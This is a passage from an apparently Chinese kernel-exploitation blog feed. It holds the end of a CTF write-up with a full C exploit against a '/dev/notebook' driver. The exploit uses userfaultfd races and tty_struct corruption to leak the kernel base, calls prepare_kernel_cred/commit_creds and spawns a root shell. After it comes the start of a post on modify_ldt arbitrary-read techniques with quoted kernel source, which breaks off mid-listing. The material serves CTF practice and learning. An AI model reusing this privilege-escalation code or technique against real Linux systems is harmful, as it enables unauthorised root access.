class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">userfaultfd_stuck_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x300</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_chunk</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_thread</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edit(idx, <span class="number">0</span>, stuck_mapped_memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_thread</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    create(idx, <span class="number">0x60</span>, stuck_mapped_memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error opening /dev/notebook\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    stuck_mapped_memory = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">char</span> *buf_tty;</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    buf_tty = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&quot;a&quot;</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf_tty, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    create(<span class="number">0</span>, <span class="number">0x60</span>, buf);</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x60</span>, buf);</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x500</span>, buf);</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x2e0</span>, buf);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (tty_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ErrExit(<span class="string">&quot;[-] ptmx open failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        read(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf_tty == <span class="number">0x100005401</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct found! fd = %d\n&quot;</span>, tty_fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf_tty != <span class="number">0x100005401</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] leak failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ptm_unix98_ops_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> work_for_cpu_fn_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred_addr;</span><br><span class="line"></span><br><span class="line">    ptm_unix98_ops_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">if</span> ((ptm_unix98_ops_addr &amp; <span class="number">0xFFF</span>) == <span class="number">0x320</span>)</span><br><span class="line">        ptm_unix98_ops_addr += <span class="number">0x120</span>;</span><br><span class="line">    kernel_base = ptm_unix98_ops_addr - <span class="number">0xe8e440</span>;</span><br><span class="line">    work_for_cpu_fn_addr = <span class="number">0x9eb90</span> + kernel_base;</span><br><span class="line">    commit_creds_addr = <span class="number">0xa9b40</span> + kernel_base;</span><br><span class="line">    prepare_kernel_cred_addr = <span class="number">0xa9ef0</span> + kernel_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\n&quot;</span>, ptm_unix98_ops_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\n&quot;</span>, prepare_kernel_cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> chunk_arr[<span class="number">0x100</span>];</span><br><span class="line">    get_chunk(chunk_arr);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> note_0_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> note_1_addr;</span><br><span class="line">    note_0_addr = chunk_arr[<span class="number">0</span> * <span class="number">2</span>];</span><br><span class="line">    note_1_addr = chunk_arr[<span class="number">1</span> * <span class="number">2</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] note_1 addr leaked, addr: 0x%lx\n&quot;</span>, note_1_addr);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty) = <span class="number">0x100005401</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">3</span> * <span class="number">8</span>) = note_1_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">4</span> * <span class="number">8</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">5</span> * <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    write(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_operations[<span class="number">0x100</span>];</span><br><span class="line">    fake_operations[<span class="number">7</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    fake_operations[<span class="number">10</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    fake_operations[<span class="number">12</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    write(fd, fake_operations, <span class="number">1</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred finished, return 0x%lx\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">6</span> * <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty) = <span class="number">0x100005401</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">3</span> * <span class="number">8</span>) = note_1_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">4</span> * <span class="number">8</span>) = commit_creds_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">5</span> * <span class="number">8</span>) = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">6</span> * <span class="number">8</span>);</span><br><span class="line">    write(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220816181101536.png"                      alt="image-20220816181101536"                ></p><hr><p>参考链接：<a class="link"   href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#_1" >https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#_1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实这应该是kernelpwn基础中的一个，但是一直没有很关心，在最近做一道题目时又提到了这一利用方式，索性就把这玩意给先写了。&lt;/p&gt;
&lt;h3 id=&quot;简单理解&quot;&gt;&lt;a href=&quot;#简单理解&quot; class=&quot;headerlink&quot; title=&quot;简单理解&quot;&gt;&lt;/a&gt;简单</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="userfaultfd" scheme="https://cv196082.gitee.io/tags/userfaultfd/"/>
    
    <category term="tty_struct" scheme="https://cv196082.gitee.io/tags/tty-struct/"/>
    
  </entry>
  
  <entry>
    <title>modify_ldt利用</title>
    <link href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/"/>
    <id>https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/</id>
    <published>2022-08-14T08:37:45.000Z</published>
    <updated>2022-08-14T08:37:03.258Z</updated>
    
    <content type="html"><![CDATA[<p>在内核的堆题目中，如果不存在读取数据的函数可能是毫无头绪，因为堆块即便是free之后储存的也只是堆地址，这也没办法进行partial write等操作。那么在面对没有读取函数的情况下应该采取什么方法呢？</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>linux存在这样一个系统调用叫做modify_ldt，我们可以通过他获取或者修改当前进程的LDT</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            ret = read_ldt(ptr, bytecount);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">            ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里传入的参数有三个，分别是func，ptr，bytecount，其中ptr指针应该指向的是user_desc结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">    down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">        retval = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">        bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">    <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">        entries_size = bytecount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line">        <span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line">        <span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">            retval = -EFAULT;</span><br><span class="line">            <span class="keyword">goto</span> out_unlock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    retval = bytecount;</span><br><span class="line"></span><br><span class="line">    out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在read_ldt函数中可以看到这里有一个copy_to_user函数，可以看到如果我们可以控制<code>mm-&gt;context.ldt-&gt;entries</code>那我们即可实现任意地址的读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 